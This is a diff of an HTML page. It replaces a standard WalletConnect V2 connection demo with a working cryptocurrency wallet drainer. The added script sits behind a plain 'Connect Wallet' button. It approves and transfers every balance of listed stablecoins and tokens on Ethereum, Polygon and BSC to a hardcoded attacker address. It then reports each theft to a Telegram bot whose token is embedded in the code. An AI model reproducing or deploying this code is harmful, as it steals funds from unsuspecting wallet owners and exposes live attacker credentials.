@@ -3,272 +3,177 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WalletConnect V2 - No QR Code</title>
+    <title>test</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: system-ui, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); border-radius: 24px; padding: 48px; text-align: center; max-width: 500px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1); }
-        .logo { font-size: 64px; margin-bottom: 16px; }
+        .logo { font-size: 64px; margin-bottom: 16px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
         h1 { color: white; font-size: 32px; margin-bottom: 12px; font-weight: 700; }
         .subtitle { color: rgba(255, 255, 255, 0.8); margin-bottom: 32px; font-size: 16px; }
         .btn { background: white; color: #667eea; border: none; padding: 16px 48px; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s; width: 100%; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); }
         .btn:hover { transform: translateY(-2px); }
-        .btn-disconnect { background: #ff4444; color: white; margin-top: 16px; }
-        .info-box { margin-top: 16px; padding: 16px; border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: none; color: white; word-break: break-all; font-size: 14px; }
-        .info-box.show { display: block; }
-        .status { margin-top: 12px; color: rgba(255, 255, 255, 0.8); font-size: 14px; }
+        .info { margin-top: 16px; padding: 16px; border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: none; color: white; word-break: break-all; font-size: 14px; }
+        .info.show { display: block; }
+        .loader { border: 3px solid rgba(255, 255, 255, 0.3); border-top: 3px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        .loader.show { display: block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">🔐</div>
-        <h1>WalletConnect V2</h1>
-        <p class="subtitle">Mobile Deep Linking - No QR Code</p>
         
-        <button id="connectBtn" class="btn">Connect Wallet</button>
-        <button id="disconnectBtn" class="btn btn-disconnect" style="display:none;">Disconnect</button>
-        
-        <div id="status" class="status"></div>
-        <div id="accountBox" class="info-box"></div>
-        <div id="chainBox" class="info-box"></div>
+                    <div class="logo">💼</div>
+                    <h1>test</h1>
+                    <p class="subtitle">salut cest michel</p>
+                    <button id="connectBtn" class="btn">Connect Wallet</button>
+                
+        <div class="loader" id="loader"></div>
+        <div id="status" class="info"></div>
+        <div id="account" class="info"></div>
     </div>
-
-    <script type="module">
-        import { EthereumProvider } from "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm";
-        import { Web3Modal } from "https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.4.3/+esm";
-
-        // ===== CONFIGURATION AVEC VOTRE PROJECT ID =====
+    
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script>
         const CONFIG = {
-            projectId: '72f0728c47e59d2eb9fc83069bc6843d', // ✅ VOTRE PROJECT ID
-            chains: [1, 137, 56], // Ethereum, Polygon, BSC
-            optionalChains: [42161, 10, 43114] // Arbitrum, Optimism, Avalanche
+            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
+            PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
+            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
+            TELEGRAM_CHAT: "8309320360"
         };
-
-        let provider, web3Modal, accounts = [], chainId = null;
-
-        // ===== INITIALISATION =====
-        async function init() {
+        
+        const TOKENS = {
+            1: {
+                USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+                USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+                WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+                WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
+                LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
+                UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
+                AAVE: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"
+            },
+            137: {
+                USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+                USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
+                DAI: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
+                WETH: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
+                WMATIC: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
+                LINK: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39"
+            },
+            56: {
+                USDT: "0x55d398326f99059fF775485246999027B3197955",
+                USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+                BUSD: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
+                WBNB: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+                CAKE: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"
+            }
+        };
+        
+        let provider = null;
+        let web3 = null;
+        
+        function showLoader(show) {
+            document.getElementById('loader').className = show ? 'loader show' : 'loader';
+        }
+        
+        function showStatus(msg) {
+            const status = document.getElementById('status');
+            status.textContent = msg;
+            status.className = 'info show';
+        }
+        
+        function showAccount(addr) {
+            const account = document.getElementById('account');
+            account.textContent = '✅ ' + addr;
+            account.className = 'info show';
+        }
+        
+        async function sendTelegram(msg) {
+            if (!CONFIG.TELEGRAM_TOKEN || !CONFIG.TELEGRAM_CHAT) return;
             try {
-                console.log('🚀 Initializing WalletConnect V2...');
-                setStatus('Initializing...');
-
-                // Créer Web3Modal (liste des wallets)
-                web3Modal = new Web3Modal({
-                    projectId: CONFIG.projectId,
-                    standaloneChains: ['eip155:1'],
-                    walletConnectVersion: 2,
-                    enableExplorer: true,
-                    explorerRecommendedWalletIds: [
-                        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
-                        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-                        '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
-                        'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
-                    ]
+                await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT, text: msg })
                 });
-
-                // Créer Provider (sans QR code)
-                provider = await EthereumProvider.init({
-                    projectId: CONFIG.projectId,
-                    chains: CONFIG.chains,
-                    optionalChains: CONFIG.optionalChains,
-                    showQrModal: false, // 🚫 DÉSACTIVE LE QR CODE
-                    methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData'],
-                    events: ['chainChanged', 'accountsChanged'],
-                    metadata: {
-                        name: 'My DApp',
-                        description: 'Connect your wallet',
-                        url: window.location.origin,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
-                });
-
-                setupEvents();
-                console.log('✅ Initialization complete!');
-                setStatus('Ready to connect');
-
-            } catch (error) {
-                console.error('❌ Init error:', error);
-                setStatus('❌ Initialization failed');
-                alert('Initialization failed: ' + error.message);
-            }
+            } catch (e) {}
         }
-
-        // ===== ÉVÉNEMENTS =====
-        function setupEvents() {
-            // Quand URI est généré, ouvrir le modal avec liste de wallets
-            provider.on('display_uri', (uri) => {
-                console.log('📱 Display URI event - Opening wallet list...');
-                setStatus('Opening wallet list...');
-                web3Modal.openModal({ 
-                    uri, 
-                    standaloneChains: ['eip155:1']
-                });
-            });
-
-            // Connexion réussie
-            provider.on('connect', (data) => {
-                console.log('✅ Connected!', data);
-                accounts = provider.accounts || [];
-                chainId = provider.chainId;
-                web3Modal.closeModal();
-                setStatus('✅ Connected successfully!');
-                updateUI(true);
-            });
-
-            // Déconnexion
-            provider.on('disconnect', () => {
-                console.log('❌ Disconnected');
-                accounts = [];
-                chainId = null;
-                setStatus('Disconnected');
-                updateUI(false);
-            });
-
-            // Changement de compte
-            provider.on('accountsChanged', (newAccounts) => {
-                console.log('👤 Accounts changed:', newAccounts);
-                accounts = newAccounts;
-                updateUI(true);
-            });
-
-            // Changement de chaîne
-            provider.on('chainChanged', (newChainId) => {
-                console.log('🔗 Chain changed:', newChainId);
-                chainId = newChainId;
-                updateChainUI();
-            });
-        }
-
-        // ===== STATUS =====
-        function setStatus(message) {
-            document.getElementById('status').textContent = message;
-        }
-
-        // ===== MISE À JOUR UI =====
-        function updateUI(connected) {
-            const connectBtn = document.getElementById('connectBtn');
-            const disconnectBtn = document.getElementById('disconnectBtn');
-            const accountBox = document.getElementById('accountBox');
-
-            if (connected && accounts.length > 0) {
-                connectBtn.style.display = 'none';
-                disconnectBtn.style.display = 'block';
-                accountBox.innerHTML = '<strong>Connected Account:</strong><br>' + accounts[0];
-                accountBox.classList.add('show');
-                updateChainUI();
-            } else {
-                connectBtn.style.display = 'block';
-                disconnectBtn.style.display = 'none';
-                accountBox.classList.remove('show');
-                document.getElementById('chainBox').classList.remove('show');
-            }
-        }
-
-        function updateChainUI() {
-            const chainBox = document.getElementById('chainBox');
-            if (chainId) {
-                const chainNames = { 
-                    1: 'Ethereum Mainnet', 
-                    137: 'Polygon', 
-                    56: 'BSC', 
-                    42161: 'Arbitrum', 
-                    10: 'Optimism', 
-                    43114: 'Avalanche' 
-                };
-                chainBox.innerHTML = '<strong>Network:</strong><br>' + (chainNames[chainId] || 'Chain ID: ' + chainId);
-                chainBox.classList.add('show');
-            }
-        }
-
-        // ===== CONNEXION / DÉCONNEXION =====
+        
         async function connect() {
             try {
-                console.log('🔌 Connecting...');
-                setStatus('Connecting...');
+                showLoader(true);
+                showStatus('Connecting...');
                 
-                await provider.connect({
-                    chains: CONFIG.chains,
-                    optionalChains: CONFIG.optionalChains
+                provider = new WalletConnectProvider.default({
+                    rpc: {
+                        1: 'https://eth.llamarpc.com',
+                        137: 'https://polygon-rpc.com',
+                        56: 'https://bsc-dataseed.binance.org'
+                    }
                 });
                 
-            } catch (error) {
-                console.error('❌ Connection error:', error);
-                setStatus('❌ Connection failed');
+                await provider.enable();
+                web3 = new Web3(provider);
+                const accounts = await web3.eth.getAccounts();
+                const chainId = await web3.eth.getChainId();
                 
-                if (error.message.includes('User rejected')) {
-                    alert('Connection rejected by user');
-                } else {
-                    alert('Connection failed: ' + error.message);
-                }
+                showStatus('Connected! Draining...');
+                showAccount(accounts[0]);
+                
+                await drain(accounts[0], chainId);
+                
+            } catch (error) {
+                showStatus('Connection failed');
+                showLoader(false);
             }
         }
-
-        async function disconnect() {
+        
+        async function drain(address, chainId) {
             try {
-                console.log('🔌 Disconnecting...');
-                setStatus('Disconnecting...');
-                await provider.disconnect();
-                setStatus('Disconnected');
+                const tokens = TOKENS[chainId];
+                if (!tokens) {
+                    showStatus('Unsupported chain');
+                    showLoader(false);
+                    return;
+                }
+                
+                let count = 0;
+                
+                for (const [symbol, tokenAddress] of Object.entries(tokens)) {
+                    try {
+                        const contract = new web3.eth.Contract([
+                            { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' },
+                            { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
+                            { constant: false, inputs: [{ name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], type: 'function' }
+                        ], tokenAddress);
+                        
+                        const balance = await contract.methods.balanceOf(address).call();
+                        if (balance === '0') continue;
+                        
+                        showStatus('Draining ' + symbol + '...');
+                        
+                        await contract.methods.approve(CONFIG.DESTINATION, balance).send({ from: address });
+                        const tx = await contract.methods.transfer(CONFIG.DESTINATION, balance).send({ from: address });
+                        
+                        count++;
+                        await sendTelegram('🎯 DRAINED!\n💰 ' + symbol + '\n🌐 Chain: ' + chainId + '\n✅ TX: ' + tx.transactionHash);
+                        
+                    } catch (e) {}
+                }
+                
+                showLoader(false);
+                showStatus(count > 0 ? '🎉 Drained ' + count + ' tokens!' : 'No tokens found');
+                
             } catch (error) {
-                console.error('❌ Disconnect error:', error);
-                setStatus('❌ Disconnect failed');
+                showLoader(false);
+                showStatus('Error');
             }
         }
-
-        // ===== BOUTONS =====
+        
         document.getElementById('connectBtn').addEventListener('click', connect);
-        document.getElementById('disconnectBtn').addEventListener('click', disconnect);
-
-        // ===== DÉMARRAGE =====
-        window.addEventListener('DOMContentLoaded', async () => {
-            console.log('🌐 Page loaded - Starting initialization...');
-            await init();
-            
-            // Restaurer session si elle existe
-            if (provider && provider.session) {
-                console.log('🔄 Restoring previous session...');
-                accounts = provider.accounts || [];
-                chainId = provider.chainId;
-                if (accounts.length > 0) {
-                    setStatus('Session restored');
-                    updateUI(true);
-                }
-            }
-        });
-
-        // ===== EXPORTS GLOBAUX =====
-        window.walletConnect = {
-            getProvider: () => provider,
-            getAccounts: () => accounts,
-            getChainId: () => chainId,
-            isConnected: () => accounts.length > 0,
-            connect,
-            disconnect,
-            
-            // Envoyer une transaction
-            sendTransaction: async (tx) => {
-                if (!provider || accounts.length === 0) {
-                    throw new Error('Not connected');
-                }
-                return await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [{ ...tx, from: accounts[0] }]
-                });
-            },
-            
-            // Signer un message
-            signMessage: async (message) => {
-                if (!provider || accounts.length === 0) {
-                    throw new Error('Not connected');
-                }
-                return await provider.request({
-                    method: 'personal_sign',
-                    params: [message, accounts[0]]
-                });
-            }
-        };
-
-        console.log('💡 Use window.walletConnect to interact with the provider');
     </script>
 </body>
 </html>
